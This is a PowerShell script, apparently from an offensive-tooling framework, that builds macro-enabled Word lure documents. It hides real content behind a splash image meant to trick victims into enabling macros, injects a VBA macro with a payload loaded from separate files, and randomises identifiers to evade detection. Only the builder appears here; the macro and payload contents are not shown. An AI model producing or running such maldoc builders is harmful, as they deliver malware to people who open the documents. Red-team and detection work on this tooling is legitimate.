Import-Module $PSScriptRoot\..\..\internals\utils.psm1

<#
explain shit about autotext here
#>

function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    #Initial doc setup
    SetAuthor
    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false
    $fname = "$PSScriptRoot\Doc1.docx"
    $wdDoc = $wdApp.documents.open($fname)

    #Installing AutoText entry
    $verbiage = [System.IO.File]::ReadAllText("$PSScriptRoot\verbiage.txt")
    $wdApp.Selection.TypeText($verbiage) | Out-Null
    $wdApp.Selection.WholeStory() | Out-Null
    $name = RandTextAlpha -len 15 
    $autotextentry = $name
    $autotextentry2 = $name
    $wdApp.Selection.CreateAutoTextEntry("$autotextentry", "$autotextentry2") | Out-Null

    #Installing cover picture that is cleared, then AutoText is displayed
    #In prod this is some sort of 'This doc has been protected, click Enable Macros to view the protected data'
    $wdApp.Selection.WholeStory() | Out-Null
    $wdApp.Selection.Delete() | Out-Null
    $wdApp.ActiveDocument.Shapes.AddPicture("$PSScriptRoot\splash_image.png") | Out-Null

    #Install macro
    $vbaModule = $wdDoc.VBProject.VBComponents.Add(1)
    $macro = BuildMacro -name $name
    $vbaModule.CodeModule.AddFromString($macro) | Out-Null

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    } 

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp

}

function BuildMacro() {
    param(
        [Parameter(mandatory=$true)]
        [string]
        $name
    )

    $macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macro.txt")
    $payload = [System.IO.File]::ReadAllText("$PSScriptRoot\payloads.txt")
    $var_counter = 1
    do {
        $this_var_name = "aVAR" + $var_counter + "a"
        $randName = RandTextAlpha -len 15
        if ($macro.contains($this_var_name)) {
            $macro = $macro -replace $this_var_name, $randName
        } else {
            break
        }
        $var_counter++
    } while ($true)

    $var_counter = 1
    do {
        $this_var_name = "aFUNC" + $var_counter + "a"
        $randName = RandTextAlpha -len 15
        if ($macro.contains($this_var_name)) {
            $macro = $macro -replace $this_var_name, $randName
        } else {
            break
        }
        $var_counter++
    } while ($true)

    $macro = $macro -replace "aPAYLOADa", $payload
    $macro = $macro -replace "aNAME1a", $name

    return $macro
}